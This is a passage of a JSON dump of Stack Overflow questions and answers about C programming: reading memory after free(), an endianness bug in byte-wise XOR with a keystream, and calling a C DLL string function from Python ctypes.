"link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 1, "creation_date": 1499165820, "post_id": 44903955, "comment_id": 76784967, "body": "@Toby , David is right, he is talking about the printf argument."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 1, "creation_date": 1499165832, "post_id": 44903955, "comment_id": 76784976, "body": "Short version - the state of the pointed to memory after using free is undefined. As such the implementation is free to do whatever it likes with that value. This means it can change with platform, compiler, compiler version, etc - thus a [programmer should not base code on expecting it to be a certain state nor even reason about it&#39;s state."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1499165854, "post_id": 44903955, "comment_id": 76784993, "body": "@SouravGhosh Ah, my bad!"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1499165884, "post_id": 44903955, "comment_id": 76785020, "body": "Furthermore, the <code>malloc</code> function does not initialize the memory it allocates, its contents is <i>indeterminate</i>. Reading the contents of that memory (which you do with your very first dereference) <i>can</i> lead undefined behavior depending on the (seemingly random) contents."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 2, "creation_date": 1499166133, "post_id": 44903955, "comment_id": 76785184, "body": "C is a concise language for packing much undefined behavior into very few lines of code ;)"}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1499183230, "post_id": 44903955, "comment_id": 76796540, "body": "I&#39;m not sure what you mean by &quot;the value of the memory address&quot;.  If you mean, &quot;Why is <code>*m</code> 0 after I call <code>free</code>?&quot;, the answer is, because malloc/free owns that memory, and when it&#39;s allocated to you you can do anything you want to with it and malloc/free won&#39;t touch it, but after you call free the memory belongs to malloc again, so malloc can do whatever it wants to with it.  Perhaps it set it to 0 as part of its strategy for remembering that the memory was not in use, and was available for a future malloc call.  (Footnote for nitpickers: yes, I know, it can&#39;t be that simple.)"}], "answers": [{"comments": [{"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499166303, "post_id": 44904170, "comment_id": 76785301, "body": "But you can easily write to freed memory, can&#39;t you?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499166410, "post_id": 44904170, "comment_id": 76785390, "body": "@tilz0R why? how? invalid is invalid, be it read or write...."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499166456, "post_id": 44904170, "comment_id": 76785419, "body": "@tilz0R, what do you mean by &quot;easily&quot;?  Yes, you can write code that attempts to write to freed memory, but what happens is Undefined.  It might crash; it might appear to work; it might kill some unrelated program (ah, the fun of cooperative multitasking!)."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499166572, "post_id": 44904170, "comment_id": 76785498, "body": "How? <code>*ptr = 5</code> for example. I do, of course, agree with you that it is undefined behaviour, but I&#39;m trying to get a point what type of undefined behaviour is this. For example when doing <code>i = i++</code>, this is undefined behaviour because <i>compiler</i> does what it wants, but in case of free and malloc, this is not the same type of undefined behaviour. Pointer still points to RAM memory where you read or write, but now it will be undefined only because you can corrupt memory already allocated by another thread or process (whatever)."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1499166607, "post_id": 44904170, "comment_id": 76785522, "body": "@TobySpeight Yes, that&#39;s what I&#39;m trying to point for OP if it will read comments."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 1, "creation_date": 1499166697, "post_id": 44904170, "comment_id": 76785577, "body": "<code>free</code> function should be constructed as <code>free(void** p)</code> and then input pointer should be set to <code>NULL</code> automatically."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 2, "creation_date": 1499166853, "post_id": 44904170, "comment_id": 76785679, "body": "@tilz0R, are you trolling?  There&#39;s only one valid declaration of <code>free</code>, and that&#39;s <code>free(void*)</code>.  And there&#39;s only one kind of undefined behaviour, and that&#39;s Undefined."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1499166893, "post_id": 44904170, "comment_id": 76785710, "body": "@TobySpeight Yes, only one is. That&#39;s why I used <code>should</code> infront."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 7, "last_activity_date": 1499166709, "last_edit_date": 1499166709, "creation_date": 1499165995, "answer_id": 44904170, "question_id": 44903955, "link": "https://stackoverflow.com/questions/44903955/why-after-the-use-free-the-value-of-the-memory-adress-is-always-0/44904170#44904170", "title": "Why after the use &quot;free()&quot; the value of the memory adress is always 0?", "body": "<p>Let us see the <code>C11</code> standard, chapter \u00a77.22.3.3.</p>\n\n<blockquote>\n  <p>The <code>free</code> function causes the space pointed to by <code>ptr</code> to be deallocated, that is, made\n  available for further allocation. [....]</p>\n</blockquote>\n\n<p>So, that means, the pointer which was passed to <code>free()</code> is no longer a \"valid\" pointer in your program context. Thereby, attempting to access the pointer, you're essentially accessing an invalid memory which causes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>Now, what <em>actually</em> happens to the memory location and to the content of the memory location, is depending on the memory manager or the OS. It could just be left as-is, unless it is required to be allocated again by some further calls, it could either be zeroed-out, anything...that is beyond the C standard specification.</p>\n\n<hr>\n\n<p>Then, I'm not <em>preaching for</em> the coding style, but I personally find it handy to set any free-d pointer to <code>NULL</code> immediately after <code>free()</code>. \"Most of the time\", this will prevent any further use of the pointer (<em>via a segfault</em>), as <code>NULL</code> is definitely an invalid pointer in <em>all</em> context.</p>\n\n<hr>\n\n<p>That said, some points regarding your code snippet,</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/q/605845/2173917\">Please see this discussion on why not to cast the return value of malloc() and family in C..</a></li>\n<li>You must cast the argument to <code>%p</code> to <code>void *</code> as <code>printf()</code> is a variadic function and there's no default argument promotion applicable.</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1499167254, "post_id": 44904228, "comment_id": 76785962, "body": "The pointed-at memory may not even <i>exist</i> after <code>free()</code>: in a virtual-memory system, the containing page could be unmapped.  The fact that the test program carries on running is a demonstration of how easy it is to have undiagnosed errors in a C program (and why tools such as Valgrind are so valuable)."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 1, "last_activity_date": 1499166135, "creation_date": 1499166135, "answer_id": 44904228, "question_id": 44903955, "link": "https://stackoverflow.com/questions/44903955/why-after-the-use-free-the-value-of-the-memory-adress-is-always-0/44904228#44904228", "title": "Why after the use &quot;free()&quot; the value of the memory adress is always 0?", "body": "<p>After calling <code>free()</code>, the pointer itself contains the old address to memory which is now possibly invalid. The pointed-at value has an indeterminate value, which could be anything. Reading it can result in a crash, a random garbage value or some manner of seemingly deterministic value - what will happen is not well-defined. </p>\n\n<p>You can't know what will happen and there are no guarantees. Therefore, pondering why you get a certain value when you do this is meaningless practice, even for learning purposes. You shouldn't access that memory, simple as that.</p>\n"}], "owner": {"reputation": 77, "user_id": 7793065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50e28e87b84cddd8ade02240e96a5c76?s=128&d=identicon&r=PG", "display_name": "Luigi Capogrosso", "link": "https://stackoverflow.com/users/7793065/luigi-capogrosso"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 414, "favorite_count": 0, "closed_date": 1499177942, "answer_count": 2, "score": -2, "last_activity_date": 1499175652, "creation_date": 1499165396, "last_edit_date": 1499175652, "question_id": 44903955, "link": "https://stackoverflow.com/questions/44903955/why-after-the-use-free-the-value-of-the-memory-adress-is-always-0", "closed_reason": "Duplicate", "title": "Why after the use &quot;free()&quot; the value of the memory adress is always 0?", "body": "<p>I have this code:   </p>\n\n<pre><code>int * m = (int *)malloc(sizeof(int));\nprintf(\"%p %i\\n\", m, *m);\n(*m) = 6;\nprintf(\"%p %i\\n\", m, *m);\nfree(m);\nprintf(\"%p %i\\n\", m, *m);\n</code></pre>\n\n<p>I run it on Linux. Why the value of the memory address is always 0?</p>\n\n<p>Why if I run it on Windows this value changes?</p>\n"}, {"tags": ["c", "char", "int", "bit-manipulation", "unsigned"], "comments": [{"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 2, "creation_date": 1499164219, "post_id": 44903424, "comment_id": 76783908, "body": "<i>&quot;But it doesn&#39;t work even close to expected.&quot;</i> What is expected? What happens instead?"}, {"owner": {"reputation": 171, "user_id": 1189410, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6d84c2a7a87d246b13493ef788c17890?s=128&d=identicon&r=PG", "display_name": "Jussi Hietanen", "link": "https://stackoverflow.com/users/1189410/jussi-hietanen"}, "reply_to_user": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1499164441, "post_id": 44903424, "comment_id": 76784082, "body": "I have a reference data to encrypt, and with the reference data the first 32-bit chunk is 0x803f7225 where it should be 0x8ceba629. With the wo_data type casted to uint32_t it outputs the right data."}, {"owner": {"reputation": 8652, "user_id": 2040863, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IspsC.jpg?s=128&g=1", "display_name": "John Hascall", "link": "https://stackoverflow.com/users/2040863/john-hascall"}, "edited": false, "score": 0, "creation_date": 1499165228, "post_id": 44903424, "comment_id": 76784576, "body": "It would seem you are XORing with initialized data."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499165583, "post_id": 44903424, "comment_id": 76784803, "body": "By editing the post, you should make clear what data <code>KS</code> and <code>wo_data</code> contain initially, what results you get and what results you expect."}, {"owner": {"reputation": 171, "user_id": 1189410, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6d84c2a7a87d246b13493ef788c17890?s=128&d=identicon&r=PG", "display_name": "Jussi Hietanen", "link": "https://stackoverflow.com/users/1189410/jussi-hietanen"}, "edited": false, "score": 0, "creation_date": 1499165605, "post_id": 44903424, "comment_id": 76784817, "body": "Yes I am. Both wo_data and KS are initialized already."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1499166332, "post_id": 44903424, "comment_id": 76785330, "body": "&quot;The data is in form uint8_t&quot; ... &quot;Data is initialized with following: 7EC61272 ...&quot;  How does this make any sense? You can&#39;t store 32 bit numbers in a <code>uint8_t</code>."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1499166973, "post_id": 44903424, "comment_id": 76785757, "body": "Please show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 171, "user_id": 1189410, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6d84c2a7a87d246b13493ef788c17890?s=128&d=identicon&r=PG", "display_name": "Jussi Hietanen", "link": "https://stackoverflow.com/users/1189410/jussi-hietanen"}, "edited": false, "score": 0, "creation_date": 1499167034, "post_id": 44903424, "comment_id": 76785801, "body": "The array is initialized elsewhere and is passed to the function type casted as a <code>uint8_t</code> . Is that where I&#39;m going wrong with this one? edit: The array is initialized elsewhere as <code>uint32_t</code> , this function takes it with parameter type <code>uint8_t</code>. So I type cast the original <code>uint32_t</code> when calling this function. But I just don&#39;t know how it would change anything. It should not, right?"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 2, "creation_date": 1499172033, "post_id": 44903424, "comment_id": 76789489, "body": "Are you sure about the endianness? Also, <code>&amp; 0xff</code> <i>after</i> casting to <code>uint8_t</code> look superfluous."}, {"owner": {"reputation": 171, "user_id": 1189410, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6d84c2a7a87d246b13493ef788c17890?s=128&d=identicon&r=PG", "display_name": "Jussi Hietanen", "link": "https://stackoverflow.com/users/1189410/jussi-hietanen"}, "edited": false, "score": 0, "creation_date": 1499173389, "post_id": 44903424, "comment_id": 76790488, "body": "Haha, yes I am, and the bitmask is there because I had no idea what was happening as the code didn&#39;t work as expected."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499173739, "post_id": 44903424, "comment_id": 76790689, "body": "&quot;The array is initialized elsewhere and is passed to the function type casted as a uint8_t&quot;  That doesn&#39;t make any sense either. You have 8 items that go in wo_data and 8 that go in KS. If but wo_data is the 4 byte representations of these 8 integers, then you would have to loop over that data 4*8=32 times. But you only iterate 8 times."}], "answers": [{"comments": [{"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1499339314, "post_id": 44908537, "comment_id": 76869363, "body": "The efficiency really has nothing to do with vectorization. You can see the compiler generating more efficient code for the 32-bit version if you turn <i>off</i> all vector operations. It&#39;s just a simple consequence of the fact that processing 4 bytes at a time is faster than processing 1 byte at a time. (I guess maybe that&#39;s &quot;vectorization&quot; in the most trivial of senses, but it&#39;s not what the term commonly means when applied in an optimization context.)"}, {"owner": {"reputation": 1351, "user_id": 1037634, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fOJYR.png?s=128&g=1", "display_name": "chus", "link": "https://stackoverflow.com/users/1037634/chus"}, "reply_to_user": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1499341158, "post_id": 44908537, "comment_id": 76870586, "body": "As you say, a scalar 32-bit version is more efficient than the 8-bit version (4 bytes vs. 1 byte processed per instruction). But a vectorized 32-bit version is probably faster than a scalar 32-bit version (for AVX, 32 bytes vs. 8 bytes processed per instruction). <a href=\"https://godbolt.org/g/B9rjRH\" rel=\"nofollow noreferrer\">See assembly code for both scalar and vectorized versions</a>."}], "tags": [], "owner": {"reputation": 1351, "user_id": 1037634, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fOJYR.png?s=128&g=1", "display_name": "chus", "link": "https://stackoverflow.com/users/1037634/chus"}, "is_accepted": true, "score": 3, "last_activity_date": 1499341370, "last_edit_date": 1499341370, "creation_date": 1499178495, "answer_id": 44908537, "question_id": 44903424, "link": "https://stackoverflow.com/questions/44903424/type-casting-in-bitwise-operations-confuses-me-in-c/44908537#44908537", "title": "Type casting in bitwise operations confuses me in C", "body": "<p>As @Arkku stated in the comments, it is an endianness issue.</p>\n\n<p>For instance, if you are in a little-endian machine, K[0]=0xF22DB45B is stored in the following way:</p>\n\n<pre><code>@K+0: 5B\n@K+1: B4\n@K+2: 2D\n@K+3: F2\n</code></pre>\n\n<p>Hence, the least significant byte (LSB) of each KS word has to be XORed with <code>wo_data[4*i+0]</code>, and so on.</p>\n\n<p>This code gives the expected values:</p>\n\n<pre><code>for (int i=0; i &lt; N; i++)\n{\n    wo_data[4*i+0] ^= ((KS[i]      ) &amp; 0xff);\n    wo_data[4*i+1] ^= ((KS[i] &gt;&gt;  8) &amp; 0xff);\n    wo_data[4*i+2] ^= ((KS[i] &gt;&gt; 16) &amp; 0xff);\n    wo_data[4*i+3] ^= ((KS[i] &gt;&gt; 24) &amp; 0xff);\n}\n</code></pre>\n\n<p>The 32-bit version is probably faster since it processes more bytes per instruction. Moreover, it can be vectorized and executed in a more efficient way. See the <a href=\"https://godbolt.org/g/VQB1eA\" rel=\"nofollow noreferrer\">generated assembly for the 8- and 32-bit versions</a>. The 8-bit version can be used to process the remaining bytes, if any.</p>\n"}], "owner": {"reputation": 171, "user_id": 1189410, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6d84c2a7a87d246b13493ef788c17890?s=128&d=identicon&r=PG", "display_name": "Jussi Hietanen", "link": "https://stackoverflow.com/users/1189410/jussi-hietanen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 276, "favorite_count": 0, "accepted_answer_id": 44908537, "answer_count": 1, "score": -1, "last_activity_date": 1499341370, "creation_date": 1499163956, "last_edit_date": 1499165816, "question_id": 44903424, "link": "https://stackoverflow.com/questions/44903424/type-casting-in-bitwise-operations-confuses-me-in-c", "title": "Type casting in bitwise operations confuses me in C", "body": "<p>I'm trying to make a part of a ciphering encryption. I'm trying to cipher the data with the keystream I got.</p>\n\n<p>The data is in form uint8_t and the keystream KS is uint32_t.</p>\n\n<p>variable n is the length of the data (in 32 bit chunks obviously)</p>\n\n<p>I have this code:</p>\n\n<pre><code>for (i=0; i&lt;n; i++)\n{\n  wo_data[4*i+0] ^= (uint8_t)(KS[i] &gt;&gt; 24) &amp; 0xff;\n  wo_data[4*i+1] ^= (uint8_t)(KS[i] &gt;&gt; 16) &amp; 0xff;\n  wo_data[4*i+2] ^= (uint8_t)(KS[i] &gt;&gt;  8) &amp; 0xff;\n  wo_data[4*i+3] ^= (uint8_t)(KS[i]      ) &amp; 0xff;\n}\n</code></pre>\n\n<p>But it doesn't work even close to expected.</p>\n\n<p>Now if I type cast the data to 32-bit length: </p>\n\n<pre><code>uint32_t* data2 = (uint32_t *)wo_data;\nfor(i=0; i &lt; n; i++)\n{\n  data2[i] ^= KS[i];\n}\n</code></pre>\n\n<p>It starts to work. Can someone explain me why? I would prefer to use the 8-bit length as it is easier to align the ending if the input data is not byte-aligned.</p>\n\n<p>Data is initialized with following:</p>\n\n<pre><code>7EC61272 743BF161 4726446A 6C38CED1\n66F6CA76 EB543004 4286346C EF130F92\n</code></pre>\n\n<p>KS is initialized with following:</p>\n\n<pre><code>F22DB45B 37E71C5B 4EB6F404 CD886C15\n9DCA27B1 F062AF46 F8E2F587 8976E8B8\n</code></pre>\n\n<p>I'm expecting following (obviously):</p>\n\n<pre><code>8CEBA629 43DCED3A 0990B06E A1B0A2C4\nFB3CEDC7 1B369F42 BA64C1EB 6665E72A\n</code></pre>\n"}, {"tags": ["python", "c", "dll"], "comments": [{"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1499175914, "post_id": 44903386, "comment_id": 76792106, "body": "<code>strCnt</code> or <code>stringUpcase</code>?"}, {"owner": {"reputation": 33, "user_id": 8253009, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd967e1c01ce31a4d2dc3d13dab70ac0?s=128&d=identicon&r=PG&f=1", "display_name": "Michal Marcin", "link": "https://stackoverflow.com/users/8253009/michal-marcin"}, "reply_to_user": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1499182079, "post_id": 44903386, "comment_id": 76795874, "body": "sorry my mistake ... It is <b>stringUpcase</b> function"}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 8253009, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd967e1c01ce31a4d2dc3d13dab70ac0?s=128&d=identicon&r=PG&f=1", "display_name": "Michal Marcin", "link": "https://stackoverflow.com/users/8253009/michal-marcin"}, "edited": false, "score": 0, "creation_date": 1499186428, "post_id": 44910228, "comment_id": 76798122, "body": "Thank you it works really good, but the output is <b>b&#39;HELO&#39;</b> and I would like to transform it back to &quot;python&quot; <b>string</b>. so the result will be only <b>HELO</b> How is it possible?"}, {"owner": {"reputation": 554, "user_id": 8199273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c74786754d406e4c09a33144d43f8beb?s=128&d=identicon&r=PG&f=1", "display_name": "tgregory", "link": "https://stackoverflow.com/users/8199273/tgregory"}, "reply_to_user": {"reputation": 33, "user_id": 8253009, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd967e1c01ce31a4d2dc3d13dab70ac0?s=128&d=identicon&r=PG&f=1", "display_name": "Michal Marcin", "link": "https://stackoverflow.com/users/8253009/michal-marcin"}, "edited": false, "score": 0, "creation_date": 1499186569, "post_id": 44910228, "comment_id": 76798187, "body": "@MichalMarcin decode them in some encoding, like this <code>print(outs.value.decode(&#39;ascii&#39;))</code>"}], "tags": [], "owner": {"reputation": 554, "user_id": 8199273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c74786754d406e4c09a33144d43f8beb?s=128&d=identicon&r=PG&f=1", "display_name": "tgregory", "link": "https://stackoverflow.com/users/8199273/tgregory"}, "is_accepted": true, "score": 1, "last_activity_date": 1499184068, "creation_date": 1499184068, "answer_id": 44910228, "question_id": 44903386, "link": "https://stackoverflow.com/questions/44903386/import-c-dll-function-in-python/44910228#44910228", "title": "Import C dll function in python", "body": "<p>You are trying to pass python string as an argument of type <code>c_char_p</code>. Python3 unlike python2 is pretty strict about typing in ctypes. </p>\n\n<p>The working sample would look like this.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import ctypes\n\nins = ctypes.c_char_p(b'helo') \nlens = len(ins.value)\nouts = ctypes.create_string_buffer(lens+1)\nlib = ctypes.cdll.LoadLibrary(\"./upper.so\")\n\nlib.stringUpcase.restype = None\nlib.stringUpcase.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int32]\n\nlib.stringUpcase(ins, outs, lens)\n\nprint(outs.value)\n</code></pre>\n\n<p>Pay attention to the fact that <code>c_char_p</code> points to a zero-terminated string, so <code>len</code> argument is redundant here. Moreover to construct <code>c_char_p</code> you need to pass bytes object or and integer address rather than just a string, to be able to use string as an argument you need to use <code>c_wchar_p</code> type and <code>wchar_t*</code> in your library respectively. </p>\n\n<p>One more thing to pay attention to is the fact that your <code>C</code> function does not allocate memory so you need for <code>outs</code> to be large enough to contain the result.</p>\n"}], "owner": {"reputation": 33, "user_id": 8253009, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd967e1c01ce31a4d2dc3d13dab70ac0?s=128&d=identicon&r=PG&f=1", "display_name": "Michal Marcin", "link": "https://stackoverflow.com/users/8253009/michal-marcin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 986, "favorite_count": 0, "accepted_answer_id": 44910228, "answer_count": 1, "score": 1, "last_activity_date": 1499184068, "creation_date": 1499163835, "last_edit_date": 1499181448, "question_id": 44903386, "link": "https://stackoverflow.com/questions/44903386/import-c-dll-function-in-python", "title": "Import C dll function in python", "body": "<p>Which data type should be used in this <strong>stringUpcase</strong> function in my DLL file</p>\n\n<pre><code>void __cdecl stringUpcase(char IN_str[], char OUT_str[], int32_t len);\n</code></pre>\n\n<p>I am trying ctype.c_char_p in Python 3.6 and This function should return the uppercase string \"HELO\" in OUT_str variable. </p>\n\n<pre><code>dl = ctypes.cdll.LoadLibrary(\"path/of/dll/file.dll\")\n\nIN_str = 'helo'\nOUT_str = ''\nIN_len = len(IN_str)\n\ndl.stringUpcase.restype = ctypes.c_void_p\ndl.stringUpcase.argtypes = [ctypes.c_char_p, 